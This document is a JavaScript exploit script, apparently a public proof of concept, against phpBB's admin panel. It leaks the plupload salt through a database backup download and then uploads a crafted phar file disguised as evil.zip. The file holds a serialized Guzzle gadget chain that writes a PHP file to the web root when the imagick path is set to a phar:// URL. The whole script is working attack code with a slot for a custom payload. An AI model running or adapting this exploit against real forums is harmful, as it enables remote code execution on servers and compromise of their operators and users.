
// All greets goes to RIPS Tech
// Run this JS on Attachment Settings ACP page
var plupload_salt = &#039;&#039;;
var form_token = &#039;&#039;;
var creation_time = &#039;&#039;;
var filepath = &#039;phar://./../files/plupload/$salt_aaae9cba5fdadb1f0c384934cd20d11czip.part&#039;; // md5(&#039;evil.zip&#039;) = aaae9cba5fdadb1f0c384934cd20d11czip
// your payload here
var payload = &#039;<?php __HALT_COMPILER(); ?>\x0d\x0a\xfe\x01\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01&#039;+&#039;\x00&#039;.repeat(5)+&#039;\xc8\x01\x00\x00O:31:"GuzzleHttp\x5cCookie\x5cFileCookieJar":4:{s:41:"\x00GuzzleHttp\x5cCookie\x5cFileCookieJar\x00filename";s:30:"/var/www/html/phpBB3/pinfo.php";s:52:"\x00GuzzleHttp\x5cCookie\x5cFileCookieJar\x00storeSessionCookies";b:1;s:36:"\x00GuzzleHttp\x5cCookie\x5cCookieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\x5cCookie\x5cSetCookie":1:{s:33:"\x00GuzzleHttp\x5cCookie\x5cSetCookie\x00data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:17:"<?php phpinfo();#";}}}s:39:"\x00GuzzleHttp\x5cCookie\x5cCookieJar\x00strictMode";N;}\x08\x00\x00\x00test.txt\x04\x00\x00\x00K>\x10\x5c\x04\x00\x00\x00\x0c~\x7f\xd8\xb6\x01&#039;+&#039;\x00&#039;.repeat(6)+&#039;test\xa0\x17\xd2\xe0R\xcf \xf6T\x1d\x01X\x91(\x9dD]X\x0b>\x02\x00\x00\x00GBMB&#039;;
var byteArray = Uint8Array.from(payload, function(c){return c.codePointAt(0);});
var sid = (new URL(document.location.href)).searchParams.get(&#039;sid&#039;);
var url = &#039;/adm/index.php&#039;;
var getparams = {
    &#039;i&#039;: &#039;acp_database&#039;,
    &#039;sid&#039;: sid,
    &#039;mode&#039;: &#039;backup&#039;
};
$.get(url, getparams, function(data) {
    form_token = $(data).find(&#039;[name="form_token"]&#039;).val();
    creation_time = $(data).find(&#039;[name="creation_time"]&#039;).val();
    if(form_token && creation_time) {
        var posturl = &#039;/adm/index.php?i=acp_database&sid=|&mode=backup&action=download&#039;;
        var postdata = {
            &#039;type&#039;: &#039;data&#039;,
            &#039;method&#039;: &#039;text&#039;,
            &#039;where&#039;: &#039;download&#039;,
            &#039;table[]&#039;: &#039;phpbb_config&#039;,
            &#039;submit&#039;: &#039;Submit&#039;,
            &#039;creation_time&#039;: creation_time,
            &#039;form_token&#039;: form_token
        }
        $.post(posturl.replace("|", sid), postdata, function (data) {
            plupload_salt = data.match(/plupload_salt&#039;,\s*&#039;(\w{32})/)[1];
            if (plupload_salt) {
                filepath = filepath.replace("$salt", plupload_salt);
                var postdata = new FormData();
                postdata.append(&#039;name&#039;, &#039;evil.zip&#039;);
                postdata.append(&#039;chunk&#039;, 0);
                postdata.append(&#039;chunks&#039;, 2);
                postdata.append(&#039;add_file&#039;, &#039;Add the file&#039;);
                postdata.append(&#039;real_filename&#039;, &#039;evil.zip&#039;);
                // file
                var pharfile = new File([byteArray], &#039;evil.zip&#039;);
                postdata.append(&#039;fileupload&#039;, pharfile);
                jQuery.ajax({
                    url: &#039;/posting.php?mode=reply&f=2&t=1&#039;,
                    data: postdata,
                    cache: false,
                    contentType: false,
                    processData: false,
                    method: &#039;POST&#039;,
                    success: function(data){
                        if ("id" in data) {
                            $(&#039;#img_imagick&#039;).val(filepath).focus();
                            $(&#039;html, body&#039;).animate({
                                scrollTop: ($(&#039;#submit&#039;).offset().top)
                            }, 500);
                        }
                    }
                });

            }
        }, &#039;text&#039;);
    }
});

